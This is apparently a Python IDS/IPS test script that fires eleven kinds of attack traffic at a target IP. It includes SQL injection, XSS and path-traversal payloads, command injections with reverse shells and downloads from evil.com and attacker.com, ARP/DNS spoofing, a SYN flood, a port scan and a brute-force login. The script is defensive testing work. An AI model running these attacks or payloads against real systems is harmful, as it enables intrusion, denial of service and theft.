#!/usr/bin/env python3
"""
SudoSOC Attack Test Suite
━━━━━━━━━━━━━━━━━━━━━━━━━
Automated multi-vector attack simulation to stress-test the IDS/IPS engine.

Attack vectors:
  1. SQL Injection (multiple variants)
  2. XSS / Cross-Site Scripting
  3. DDoS / SYN Flood simulation
  4. Path Traversal / Directory Traversal
  5. Command Injection (OS command)
  6. MITM-style ARP anomaly / DNS poisoning patterns
  7. Port Scanning (reconnaissance)
  8. C2 Beaconing (suspicious port activity)
  9. Data Exfiltration (high-volume encrypted-looking data)
 10. Brute Force (rapid auth attempts)

Works with or without admin privileges:
  - With admin: uses Scapy raw packets (best detection)
  - Without admin: uses TCP sockets (still generates real traffic for IDS)

Usage:
    python attack_test_suite.py                     # Run all attacks
    python attack_test_suite.py --attacks sqli xss  # Run specific attacks
    python attack_test_suite.py --target 127.0.0.1  # Custom target
"""

import sys
import os
import time
import random
import socket
import struct
import threading
import argparse
import json
from datetime import datetime
from collections import defaultdict

# ── Platform detection ──
import platform
import ctypes

IS_WINDOWS = platform.system() == "Windows"
IS_ADMIN = False
if IS_WINDOWS:
    IS_ADMIN = ctypes.windll.shell32.IsUserAnAdmin() != 0
else:
    IS_ADMIN = os.geteuid() == 0

# Fix Windows console encoding
try:
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    if hasattr(sys.stderr, "reconfigure"):
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

# ── Try Scapy for raw packets ──
SCAPY_OK = False
try:
    from scapy.all import IP, TCP, UDP, ICMP, Raw, Ether, ARP, DNS, DNSQR, send, sendp, conf
    if IS_WINDOWS:
        conf.use_pcap = True
    conf.verb = 0
    SCAPY_OK = True
except ImportError:
    pass

# ── Colors ──
class C:
    R = "\033[91m"
    G = "\033[92m"
    Y = "\033[93m"
    B = "\033[94m"
    M = "\033[95m"
    CY = "\033[96m"
    W = "\033[97m"
    DIM = "\033[2m"
    BOLD = "\033[1m"
    RST = "\033[0m"

def banner():
    print(f"""
{C.R}{C.BOLD}============================================================{C.RST}
{C.R}   SUDOSOC ATTACK TEST SUITE{C.RST}
{C.R}   Multi-Vector IDS/IPS Validation Engine{C.RST}
{C.R}{C.BOLD}============================================================{C.RST}
{C.W}   Scapy: {"AVAILABLE" if SCAPY_OK else "NOT AVAILABLE (socket mode)"}  |  Admin: {"YES" if IS_ADMIN else "NO"}{C.RST}
{C.R}{C.BOLD}============================================================{C.RST}
""")

def log_attack(name, detail=""):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"  {C.R}[ATK]{C.RST} {C.DIM}{ts}{C.RST}  {C.BOLD}{name}{C.RST}  {C.DIM}{detail}{C.RST}")

def log_info(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"  {C.B}[*]{C.RST}   {C.DIM}{ts}{C.RST}  {msg}")

def log_ok(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"  {C.G}[+]{C.RST}   {C.DIM}{ts}{C.RST}  {msg}")

def log_warn(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"  {C.Y}[!]{C.RST}   {C.DIM}{ts}{C.RST}  {msg}")

def log_section(name):
    print(f"\n{C.CY}{'-'*60}{C.RST}")
    print(f"  {C.CY}{C.BOLD}{name}{C.RST}")
    print(f"{C.CY}{'-'*60}{C.RST}")

# ══════════════════════════════════════════════════════════════════════════════
#  TRANSPORT LAYER - Send packets via Scapy or fallback to sockets
# ══════════════════════════════════════════════════════════════════════════════

def send_tcp_payload(target_ip, target_port, payload, timeout=2):
    """Send a TCP payload via socket (works without admin)."""
    if isinstance(payload, str):
        payload = payload.encode("utf-8", errors="replace")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((target_ip, target_port))
        s.sendall(payload)
        try:
            resp = s.recv(4096)
        except:
            resp = b""
        s.close()
        return True, resp
    except (ConnectionRefusedError, ConnectionResetError):
        return True, b""  # Connection attempted - IDS still sees it
    except socket.timeout:
        return True, b""
    except Exception as e:
        return False, str(e).encode()

def send_udp_payload(target_ip, target_port, payload, timeout=1):
    """Send a UDP payload via socket."""
    if isinstance(payload, str):
        payload = payload.encode("utf-8", errors="replace")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(payload, (target_ip, target_port))
        s.close()
        return True
    except Exception:
        return False

def send_raw_tcp(target_ip, target_port, payload, flags="PA"):
    """Send raw TCP packet via Scapy (requires admin)."""
    if not SCAPY_OK:
        return send_tcp_payload(target_ip, target_port, payload)
    if isinstance(payload, str):
        payload = payload.encode("utf-8", errors="replace")
    try:
        # SYN first
        syn = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
        send(syn, verbose=False)
        time.sleep(0.05)
        # Data
        pkt = IP(dst=target_ip) / TCP(dport=target_port, flags=flags) / Raw(load=payload)
        send(pkt, verbose=False)
        return True, b""
    except Exception as e:
        return send_tcp_payload(target_ip, target_port, payload)

def send_raw_udp(target_ip, target_port, payload):
    """Send raw UDP packet via Scapy."""
    if not SCAPY_OK:
        return send_udp_payload(target_ip, target_port, payload)
    if isinstance(payload, str):
        payload = payload.encode("utf-8", errors="replace")
    try:
        pkt = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=payload)
        send(pkt, verbose=False)
        return True
    except:
        return send_udp_payload(target_ip, target_port, payload)

# ══════════════════════════════════════════════════════════════════════════════
#  ATTACK 1: SQL INJECTION
# ══════════════════════════════════════════════════════════════════════════════

def attack_sqli(target_ip, port=80, rounds=15):
    log_section("ATTACK 1: SQL INJECTION")
    log_info(f"Target: {target_ip}:{port}  |  Rounds: {rounds}")
    
    payloads = [
        # Classic SQLi
        "GET /login?user=admin' OR '1'='1'-- HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /search?q=1' UNION SELECT username,password FROM users-- HTTP/1.1\r\nHost: target\r\n\r\n",
        "POST /login HTTP/1.1\r\nHost: target\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin'--&password=x",
        # Time-based blind SQLi
        "GET /item?id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /item?id=1' AND BENCHMARK(10000000,SHA1('test'))-- HTTP/1.1\r\nHost: target\r\n\r\n",
        # UNION-based with comment evasion
        "GET /products?id=1 UNI/**/ON SEL/**/ECT 1,2,3,4,5-- HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /api?id=1 /*!UNION*/ /*!SELECT*/ table_name FROM information_schema.tables-- HTTP/1.1\r\nHost: target\r\n\r\n",
        # Error-based SQLi  
        "GET /user?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- HTTP/1.1\r\nHost: target\r\n\r\n",
        # Stacked queries
        "GET /page?id=1'; DROP TABLE users;-- HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /page?id=1'; INSERT INTO admin VALUES('hacker','pass123');-- HTTP/1.1\r\nHost: target\r\n\r\n",
        # Second-order SQLi
        "POST /register HTTP/1.1\r\nHost: target\r\nContent-Type: application/json\r\n\r\n{\"username\":\"admin'-- \",\"email\":\"test@test.com\"}",
        # Boolean-based blind
        "GET /user?id=1' AND 1=1-- HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /user?id=1' AND 1=2-- HTTP/1.1\r\nHost: target\r\n\r\n",
        # Hex-encoded
        "GET /search?q=0x27204f522027313d2731 HTTP/1.1\r\nHost: target\r\n\r\n",
        # Double URL-encoded
        "GET /search?q=%2527%2520OR%25201%253D1-- HTTP/1.1\r\nHost: target\r\n\r\n",
    ]
    
    sent = 0
    for i in range(rounds):
        payload = payloads[i % len(payloads)]
        ok, _ = send_raw_tcp(target_ip, port, payload)
        if ok:
            sent += 1
            variant = payload.split("?")[1].split(" ")[0][:50] if "?" in payload else "POST body"
            log_attack("SQL Injection", f"variant={variant}")
        time.sleep(random.uniform(0.1, 0.4))
    
    log_ok(f"SQL Injection: {sent}/{rounds} payloads delivered")
    return sent


# ══════════════════════════════════════════════════════════════════════════════
#  ATTACK 2: XSS (Cross-Site Scripting)
# ══════════════════════════════════════════════════════════════════════════════

def attack_xss(target_ip, port=80, rounds=12):
    log_section("ATTACK 2: CROSS-SITE SCRIPTING (XSS)")
    log_info(f"Target: {target_ip}:{port}  |  Rounds: {rounds}")
    
    payloads = [
        "GET /search?q=<script>alert('XSS')</script> HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /search?q=<svg/onload=alert(1)> HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /comment?text=<img src=x onerror=alert(1)> HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /page?name=<body onpageshow=alert(1)> HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /form?val=<details open ontoggle=alert(1)> HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /search?q=<iframe src=\"javascript:alert(1)\"> HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /path?x=<marquee onstart=alert(1)> HTTP/1.1\r\nHost: target\r\n\r\n",
        "POST /api/comment HTTP/1.1\r\nHost: target\r\nContent-Type: application/json\r\n\r\n{\"body\":\"<script>document.location='http://evil.com/?c='+document.cookie</script>\"}",
        # DOM-based XSS
        "GET /page#<img src=1 onerror=alert(document.cookie)> HTTP/1.1\r\nHost: target\r\n\r\n",
        # SVG-based
        "GET /upload?name=<svg><animate onbegin=alert(1) attributeName=x dur=1s> HTTP/1.1\r\nHost: target\r\n\r\n",
        # Event handlers
        "GET /q=<input autofocus onfocus=alert(1)> HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /q=<select onchange=alert(1)><option>1</option></select> HTTP/1.1\r\nHost: target\r\n\r\n",
    ]
    
    sent = 0
    for i in range(rounds):
        payload = payloads[i % len(payloads)]
        ok, _ = send_raw_tcp(target_ip, port, payload)
        if ok:
            sent += 1
            log_attack("XSS", f"payload #{i+1}")
        time.sleep(random.uniform(0.1, 0.3))
    
    log_ok(f"XSS: {sent}/{rounds} payloads delivered")
    return sent


# ══════════════════════════════════════════════════════════════════════════════
#  ATTACK 3: DDoS / SYN FLOOD
# ══════════════════════════════════════════════════════════════════════════════

def attack_ddos(target_ip, port=80, rounds=200, threads=5):
    log_section("ATTACK 3: DDoS / SYN FLOOD SIMULATION")
    log_info(f"Target: {target_ip}:{port}  |  Connections: {rounds}  |  Threads: {threads}")
    
    counter = {"sent": 0, "lock": threading.Lock()}
    
    def flood_worker(worker_id, count):
        for i in range(count):
            try:
                if SCAPY_OK and IS_ADMIN:
                    # Raw SYN flood
                    src_port = random.randint(1024, 65535)
                    pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=port, flags="S")
                    send(pkt, verbose=False)
                else:
                    # Socket-based rapid connection
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.3)
                    s.connect_ex((target_ip, port))
                    # Send junk data to make it look like an attack
                    try:
                        s.sendall(b"X" * random.randint(100, 2000))
                    except:
                        pass
                    s.close()
                
                with counter["lock"]:
                    counter["sent"] += 1
                    if counter["sent"] % 50 == 0:
                        log_attack("DDoS/SYN Flood", f"{counter['sent']}/{rounds} connections")
            except:
                pass
            time.sleep(random.uniform(0.005, 0.02))
    
    # Launch threads
    per_thread = rounds // threads
    thread_list = []
    for t in range(threads):
        th = threading.Thread(target=flood_worker, args=(t, per_thread), daemon=True)
        thread_list.append(th)
        th.start()
    
    for th in thread_list:
        th.join(timeout=60)
    
    log_ok(f"DDoS: {counter['sent']}/{rounds} flood packets sent")
    return counter["sent"]


# ══════════════════════════════════════════════════════════════════════════════
#  ATTACK 4: PATH TRAVERSAL
# ══════════════════════════════════════════════════════════════════════════════

def attack_traversal(target_ip, port=80, rounds=10):
    log_section("ATTACK 4: PATH TRAVERSAL / DIRECTORY TRAVERSAL")
    log_info(f"Target: {target_ip}:{port}  |  Rounds: {rounds}")
    
    payloads = [
        "GET /../../etc/passwd HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /....//....//....//etc/passwd HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /..%2f..%2f..%2fetc%2fpasswd HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /..\\..\\..\\windows\\system32\\drivers\\etc\\hosts HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /%2e%2e/%2e%2e/%2e%2e/etc/shadow HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /static/../../../etc/passwd HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /download?file=../../../etc/passwd HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /view?path=....//....//boot.ini HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /include?page=../../../proc/self/environ HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /files?name=..%252f..%252f..%252fetc%252fpasswd HTTP/1.1\r\nHost: target\r\n\r\n",
    ]
    
    sent = 0
    for i in range(rounds):
        payload = payloads[i % len(payloads)]
        ok, _ = send_raw_tcp(target_ip, port, payload)
        if ok:
            sent += 1
            path = payload.split(" ")[1][:40]
            log_attack("Path Traversal", f"path={path}")
        time.sleep(random.uniform(0.1, 0.3))
    
    log_ok(f"Path Traversal: {sent}/{rounds} payloads delivered")
    return sent


# ══════════════════════════════════════════════════════════════════════════════
#  ATTACK 5: COMMAND INJECTION
# ══════════════════════════════════════════════════════════════════════════════

def attack_cmd_injection(target_ip, port=80, rounds=10):
    log_section("ATTACK 5: COMMAND INJECTION")
    log_info(f"Target: {target_ip}:{port}  |  Rounds: {rounds}")
    
    payloads = [
        "GET /ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /exec?cmd=cmd.exe /c whoami HTTP/1.1\r\nHost: target\r\n\r\n",
        "POST /api/run HTTP/1.1\r\nHost: target\r\nContent-Type: application/json\r\n\r\n{\"command\":\"powershell -e ZQBjAGgAbwAgACIAcAB3AG4AZQBkACIA\"}",
        "GET /cmd?q=;nc -e /bin/bash attacker.com 4444 HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /ping?ip=|wget http://evil.com/shell.sh HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /diag?host=`curl http://evil.com/payload` HTTP/1.1\r\nHost: target\r\n\r\n",
        "POST /tools HTTP/1.1\r\nHost: target\r\n\r\ncmd=python -c 'import os;os.system(\"whoami\")'",
        "GET /api?param=|/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET /lookup?domain=;echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash HTTP/1.1\r\nHost: target\r\n\r\n",
        "POST /exec HTTP/1.1\r\nHost: target\r\n\r\ncmd=c^m^d.e^x^e /c net user hacker Pass123! /add",
    ]
    
    sent = 0
    for i in range(rounds):
        payload = payloads[i % len(payloads)]
        ok, _ = send_raw_tcp(target_ip, port, payload)
        if ok:
            sent += 1
            log_attack("Command Injection", f"payload #{i+1}")
        time.sleep(random.uniform(0.1, 0.4))
    
    log_ok(f"Command Injection: {sent}/{rounds} payloads delivered")
    return sent


# ══════════════════════════════════════════════════════════════════════════════
#  ATTACK 6: MITM-STYLE (ARP Spoofing / DNS Poisoning patterns)
# ══════════════════════════════════════════════════════════════════════════════

def attack_mitm(target_ip, rounds=15):
    log_section("ATTACK 6: MITM-STYLE ANOMALY PATTERNS")
    log_info(f"Target: {target_ip}  |  Rounds: {rounds}")
    
    sent = 0
    
    if SCAPY_OK and IS_ADMIN:
        # ARP spoofing pattern: gratuitous ARP replies
        log_info("Phase 1: ARP cache poisoning attempts")
        for i in range(min(rounds, 8)):
            try:
                # Forge gratuitous ARP claiming to be the gateway
                fake_gw_ip = target_ip.rsplit(".", 1)[0] + ".1"
                fake_mac = f"de:ad:be:ef:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
                arp_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2,  # ARP reply (unsolicited)
                    psrc=fake_gw_ip,
                    hwsrc=fake_mac,
                    pdst=target_ip,
                )
                sendp(arp_pkt, verbose=False)
                sent += 1
                log_attack("ARP Spoof", f"claiming {fake_gw_ip} is at {fake_mac}")
            except Exception as e:
                log_warn(f"ARP send failed: {e}")
            time.sleep(0.3)
        
        # DNS poisoning pattern
        log_info("Phase 2: DNS cache poisoning attempts")
        for i in range(min(rounds, 7)):
            try:
                domains = ["google.com", "bank.com", "login.microsoft.com", "github.com", "api.stripe.com"]
                domain = random.choice(domains)
                dns_pkt = IP(dst=target_ip) / UDP(sport=53, dport=random.randint(1024, 65535)) / \
                          DNS(qr=1, aa=1, qd=DNSQR(qname=domain), an=None)
                send(dns_pkt, verbose=False)
                sent += 1
                log_attack("DNS Poison", f"spoofed response for {domain}")
            except Exception as e:
                log_warn(f"DNS send failed: {e}")
            time.sleep(0.3)
    else:
        # Socket-based MITM simulation: weird DNS-like traffic
        log_info("Phase 1: Suspicious DNS-like traffic (socket mode)")
        for i in range(rounds):
            try:
                # Send data to DNS port to simulate poisoning
                domains = ["google.com", "bank.com", "login.microsoft.com", "github.com"]
                domain = random.choice(domains)
                # Malformed DNS-like payload
                payload = b"\x00\x01\x01\x00\x00\x01\x00\x01" + domain.encode() + b"\x00\x00\x01\x00\x01"
                # Also send to suspicious ports
                for port in [53, 5353, 137]:
                    send_udp_payload(target_ip, port, payload)
                sent += 1
                log_attack("MITM/DNS Anomaly", f"suspicious DNS to {domain}")
            except:
                pass
            time.sleep(0.2)
    
    log_ok(f"MITM patterns: {sent}/{rounds} anomaly packets sent")
    return sent


# ══════════════════════════════════════════════════════════════════════════════
#  ATTACK 7: PORT SCANNING (Reconnaissance)
# ══════════════════════════════════════════════════════════════════════════════

def attack_port_scan(target_ip, rounds=80):
    log_section("ATTACK 7: PORT SCANNING (RECONNAISSANCE)")
    log_info(f"Target: {target_ip}  |  Ports to scan: {rounds}")
    
    # Mix of common and suspicious ports
    ports = list(range(20, 30)) + list(range(79, 91)) + [110, 111, 135, 139, 143, 443, 445] + \
            [1337, 1433, 3306, 3389, 4444, 5432, 5555, 5900, 6379, 6667, 8080, 8443, 9001, 9050, 9200, 31337] + \
            list(range(8000, 8020))
    
    random.shuffle(ports)
    ports = ports[:rounds]
    
    sent = 0
    open_ports = []
    
    for port in ports:
        try:
            if SCAPY_OK and IS_ADMIN:
                pkt = IP(dst=target_ip) / TCP(dport=port, flags="S")
                send(pkt, verbose=False)
                sent += 1
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                result = s.connect_ex((target_ip, port))
                if result == 0:
                    open_ports.append(port)
                s.close()
                sent += 1
        except:
            pass
        
        if sent % 20 == 0:
            log_attack("Port Scan", f"scanned {sent}/{len(ports)} ports")
        time.sleep(random.uniform(0.01, 0.05))
    
    if open_ports:
        log_info(f"Open ports found: {open_ports[:20]}")
    log_ok(f"Port Scan: {sent}/{len(ports)} ports scanned")
    return sent


# ══════════════════════════════════════════════════════════════════════════════
#  ATTACK 8: C2 BEACONING
# ══════════════════════════════════════════════════════════════════════════════

def attack_c2_beacon(target_ip, rounds=20):
    log_section("ATTACK 8: C2 BEACONING (COMMAND & CONTROL)")
    log_info(f"Target: {target_ip}  |  Beacon attempts: {rounds}")
    
    c2_ports = [4444, 5555, 1337, 31337, 6667, 9001, 8888]
    
    sent = 0
    for i in range(rounds):
        port = random.choice(c2_ports)
        # Small periodic beacon (looks like check-in traffic)
        beacon_data = json.dumps({
            "id": f"bot-{random.randint(1000,9999)}",
            "cmd": "checkin",
            "ts": int(time.time()),
            "os": "win10",
            "arch": "x64",
        }).encode()
        
        ok, _ = send_raw_tcp(target_ip, port, beacon_data)
        if ok:
            sent += 1
            log_attack("C2 Beacon", f"port={port} size={len(beacon_data)}b")
        
        # Simulate jitter (real C2 has random intervals)
        time.sleep(random.uniform(0.5, 2.0))
    
    log_ok(f"C2 Beaconing: {sent}/{rounds} beacon signals sent")
    return sent


# ══════════════════════════════════════════════════════════════════════════════
#  ATTACK 9: DATA EXFILTRATION
# ══════════════════════════════════════════════════════════════════════════════

def attack_exfiltration(target_ip, port=443, rounds=10):
    log_section("ATTACK 9: DATA EXFILTRATION (HIGH VOLUME)")
    log_info(f"Target: {target_ip}:{port}  |  Rounds: {rounds}")
    
    sent = 0
    total_bytes = 0
    
    for i in range(rounds):
        # Generate large high-entropy data (looks like encrypted exfil)
        size = random.randint(50000, 200000)
        data = bytes([random.randint(0, 255) for _ in range(size)])
        
        # Mix some "stolen data" markers
        markers = [
            b"SSN:123-45-6789\n",
            b"CC:4111111111111111\n",
            b"password:admin123\n",
            b"BEGIN RSA PRIVATE KEY\n",
            b"AWS_SECRET_ACCESS_KEY=",
        ]
        data = random.choice(markers) + data
        
        if SCAPY_OK and IS_ADMIN:
            # Send as raw packets in chunks
            chunk_size = 1400
            for offset in range(0, min(len(data), 14000), chunk_size):
                chunk = data[offset:offset + chunk_size]
                pkt = IP(dst=target_ip) / TCP(dport=port, flags="PA") / Raw(load=chunk)
                send(pkt, verbose=False)
            sent += 1
            total_bytes += len(data)
        else:
            ok, _ = send_tcp_payload(target_ip, port, data[:50000])
            if ok:
                sent += 1
                total_bytes += min(len(data), 50000)
        
        log_attack("Data Exfiltration", f"chunk {i+1}: {len(data)//1024}KB high-entropy data")
        time.sleep(random.uniform(0.3, 1.0))
    
    log_ok(f"Exfiltration: {sent}/{rounds} data chunks sent ({total_bytes//1024}KB total)")
    return sent


# ══════════════════════════════════════════════════════════════════════════════
#  ATTACK 10: BRUTE FORCE
# ══════════════════════════════════════════════════════════════════════════════

def attack_brute_force(target_ip, port=80, rounds=50):
    log_section("ATTACK 10: BRUTE FORCE (RAPID AUTH ATTEMPTS)")
    log_info(f"Target: {target_ip}:{port}  |  Attempts: {rounds}")
    
    usernames = ["admin", "root", "administrator", "user", "test", "guest", "operator", "sysadmin"]
    passwords = ["password", "123456", "admin", "root", "letmein", "qwerty", "password123",
                 "abc123", "monkey", "master", "dragon", "login", "welcome", "shadow"]
    
    sent = 0
    for i in range(rounds):
        user = random.choice(usernames)
        passwd = random.choice(passwords)
        
        payload = (
            f"POST /login HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(f'username={user}&password={passwd}')}\r\n"
            f"\r\n"
            f"username={user}&password={passwd}"
        )
        
        ok, _ = send_raw_tcp(target_ip, port, payload)
        if ok:
            sent += 1
            if sent % 10 == 0:
                log_attack("Brute Force", f"{sent}/{rounds} attempts  (last: {user}:{passwd})")
        time.sleep(random.uniform(0.02, 0.1))
    
    log_ok(f"Brute Force: {sent}/{rounds} login attempts sent")
    return sent


# ══════════════════════════════════════════════════════════════════════════════
#  ATTACK 11: NOP SLED / SHELLCODE
# ══════════════════════════════════════════════════════════════════════════════

def attack_shellcode(target_ip, port=4444, rounds=8):
    log_section("ATTACK 11: SHELLCODE / NOP SLED INJECTION")
    log_info(f"Target: {target_ip}:{port}  |  Rounds: {rounds}")
    
    sent = 0
    for i in range(rounds):
        # Polymorphic NOP sled + fake shellcode
        nops = [b"\x90", b"\x41", b"\x42", b"\x43", b"\x44", b"\x93", b"\x97"]
        sled = b"".join(random.choice(nops) for _ in range(64))
        # Fake shellcode payload
        shellcode = sled + b"\xcc\xcc\xcc\xcc" + bytes([random.randint(0, 255) for _ in range(128)])
        
        ok, _ = send_raw_tcp(target_ip, port, shellcode)
        if ok:
            sent += 1
            log_attack("Shellcode/NOP Sled", f"sled_size=64 + payload={len(shellcode)}b to port {port}")
        time.sleep(random.uniform(0.2, 0.5))
    
    log_ok(f"Shellcode: {sent}/{rounds} payloads delivered")
    return sent


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN - ORCHESTRATOR
# ══════════════════════════════════════════════════════════════════════════════

ATTACK_MAP = {
    "sqli":        ("SQL Injection",           attack_sqli),
    "xss":         ("Cross-Site Scripting",    attack_xss),
    "ddos":        ("DDoS / SYN Flood",        attack_ddos),
    "traversal":   ("Path Traversal",          attack_traversal),
    "cmdi":        ("Command Injection",       attack_cmd_injection),
    "mitm":        ("MITM / ARP / DNS",        attack_mitm),
    "portscan":    ("Port Scanning",           attack_port_scan),
    "c2":          ("C2 Beaconing",            attack_c2_beacon),
    "exfil":       ("Data Exfiltration",       attack_exfiltration),
    "bruteforce":  ("Brute Force Login",       attack_brute_force),
    "shellcode":   ("Shellcode / NOP Sled",    attack_shellcode),
}

def main():
    parser = argparse.ArgumentParser(description="SudoSOC Attack Test Suite")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP (default: 127.0.0.1)")
    parser.add_argument("--attacks", nargs="*", default=None,
                        help=f"Specific attacks to run: {', '.join(ATTACK_MAP.keys())}")
    parser.add_argument("--intensity", choices=["low", "medium", "high"], default="medium",
                        help="Attack intensity level")
    args = parser.parse_args()
    
    banner()
    
    target = args.target
    attacks_to_run = args.attacks or list(ATTACK_MAP.keys())
    
    # Intensity multipliers
    intensity_mult = {"low": 0.5, "medium": 1.0, "high": 2.0}
    mult = intensity_mult[args.intensity]
    
    log_info(f"Target: {target}")
    log_info(f"Attacks: {', '.join(attacks_to_run)}")
    log_info(f"Intensity: {args.intensity} (x{mult})")
    log_info(f"Transport: {'Scapy raw packets' if SCAPY_OK and IS_ADMIN else 'TCP/UDP sockets'}")
    print()
    
    results = {}
    start_time = time.time()
    
    for attack_key in attacks_to_run:
        if attack_key not in ATTACK_MAP:
            log_warn(f"Unknown attack: {attack_key} - skipping")
            continue
        
        name, func = ATTACK_MAP[attack_key]
        try:
            if attack_key == "sqli":
                count = func(target, 80, int(15 * mult))
            elif attack_key == "xss":
                count = func(target, 80, int(12 * mult))
            elif attack_key == "ddos":
                count = func(target, 80, int(200 * mult), threads=5)
            elif attack_key == "traversal":
                count = func(target, 80, int(10 * mult))
            elif attack_key == "cmdi":
                count = func(target, 80, int(10 * mult))
            elif attack_key == "mitm":
                count = func(target, int(15 * mult))
            elif attack_key == "portscan":
                count = func(target, int(80 * mult))
            elif attack_key == "c2":
                count = func(target, int(20 * mult))
            elif attack_key == "exfil":
                count = func(target, 443, int(10 * mult))
            elif attack_key == "bruteforce":
                count = func(target, 80, int(50 * mult))
            elif attack_key == "shellcode":
                count = func(target, 4444, int(8 * mult))
            else:
                count = 0
            
            results[name] = count
        except Exception as e:
            log_warn(f"Attack '{name}' failed: {e}")
            results[name] = 0
    
    elapsed = time.time() - start_time
    
    # Summary
    print(f"\n{C.R}{'='*60}{C.RST}")
    print(f"  {C.R}{C.BOLD}ATTACK TEST SUITE - SUMMARY{C.RST}")
    print(f"{C.R}{'='*60}{C.RST}")
    print(f"  {C.DIM}Duration: {elapsed:.1f}s  |  Target: {target}{C.RST}")
    print()
    
    total_sent = 0
    for name, count in results.items():
        status = f"{C.G}SENT{C.RST}" if count > 0 else f"{C.R}FAIL{C.RST}"
        print(f"  {status}  {name:.<35} {count:>5} packets")
        total_sent += count
    
    print(f"\n  {C.BOLD}Total packets sent: {total_sent}{C.RST}")
    print(f"\n  {C.Y}Check the IDS dashboard at http://localhost:8501{C.RST}")
    print(f"  {C.Y}Check IDS engine logs: ids_engine.log & ids_alerts.jsonl{C.RST}")
    print(f"{C.R}{'='*60}{C.RST}\n")
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
